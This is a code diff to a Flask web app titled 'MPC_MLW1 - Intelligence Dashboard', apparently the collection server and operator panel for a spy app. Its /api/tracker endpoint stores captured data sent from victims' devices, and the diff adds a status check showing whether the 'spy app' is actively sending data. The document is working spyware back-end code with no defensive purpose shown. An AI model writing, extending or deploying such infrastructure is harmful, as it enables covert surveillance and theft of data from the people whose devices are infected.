@@ -2,7 +2,7 @@ from flask import Flask, request, jsonify, render_template_string
 from flask_cors import CORS
 import psycopg2
 import os
-from datetime import datetime
+from datetime import datetime, timedelta
 
 app = Flask(__name__)
 CORS(app)
@@ -52,6 +52,7 @@ DASHBOARD_HTML = '''
         .stats { background: #1a1f3a; padding: 15px; border-radius: 10px; margin-bottom: 20px; display: flex; gap: 20px; flex-wrap: wrap; }
         .stat-box { background: #0a0e27; padding: 10px 20px; border-radius: 8px; }
         .success { color: #00ff00; font-weight: bold; }
+        .inactive { color: #ff6600; font-weight: bold; }
         .badge { background: #ff3366; color: white; padding: 2px 8px; border-radius: 20px; font-size: 11px; }
         .footer { margin-top: 30px; text-align: center; font-size: 11px; color: #666; }
     </style>
@@ -90,6 +91,16 @@ DASHBOARD_HTML = '''
             }
             document.getElementById('data').innerHTML = html;
             document.getElementById('stats').innerHTML = `📊 Total captured: ${data.length}`;
+            
+            // Update status based on last capture time
+            const statusRes = await fetch('/api/status');
+            const statusData = await statusRes.json();
+            const statusEl = document.getElementById('status');
+            if (statusData.active) {
+                statusEl.innerHTML = '<span class="success">● ACTIVE</span> (Spy app sending data)';
+            } else {
+                statusEl.innerHTML = '<span class="inactive">● INACTIVE</span> (No spy app data received)';
+            }
         }
         checkAuth();
     </script>
@@ -103,7 +114,7 @@ DASHBOARD_HTML = '''
 <div id="content" style="display:none">
     <h1>🎯 MPC_MLW1 - Intelligence Dashboard</h1>
     <div class="stats">
-        <div class="stat-box">🔴 Status: <span class="success">ACTIVE</span></div>
+        <div class="stat-box" id="status">🔴 Status: <span class="inactive">● INACTIVE</span></div>
         <div class="stat-box" id="stats">📊 Captured: 0</div>
         <div class="stat-box">🎯 Target: Attacker Device</div>
     </div>
@@ -114,7 +125,7 @@ DASHBOARD_HTML = '''
         <tbody id="data"></tbody>
     </table>
     </div>
-    <div class="footer">MPC_MLW1 Security Operations - Authorized Access Only</div>
+    <div class="footer">MPC_MLW1 Security Operations - Tool Created by Mugisha Pc</div>
 </div>
 </body>
 </html>
@@ -138,6 +149,17 @@ def login():
         return resp
     return jsonify({'success': False})
 
+@app.route('/api/status')
+def status():
+    conn = get_db()
+    cur = conn.cursor()
+    five_min_ago = datetime.now() - timedelta(minutes=5)
+    cur.execute('SELECT COUNT(*) FROM captured_data WHERE timestamp > %s', (five_min_ago,))
+    count = cur.fetchone()[0]
+    cur.close()
+    conn.close()
+    return jsonify({'active': count > 0})
+
 @app.route('/api/tracker', methods=['POST'])
 def tracker():
     data_type = request.form.get('type', request.json.get('type', 'unknown'))
@@ -149,7 +171,7 @@ def tracker():
     conn.commit()
     cur.close()
     conn.close()
-    print(f"[+] Captured - Type: {data_type}, Data: {data_content[:100]}")
+    print(f"[+] Captured - Type: {data_type}")
     return jsonify({'status': 'ok'})
 
 @app.route('/api/data')
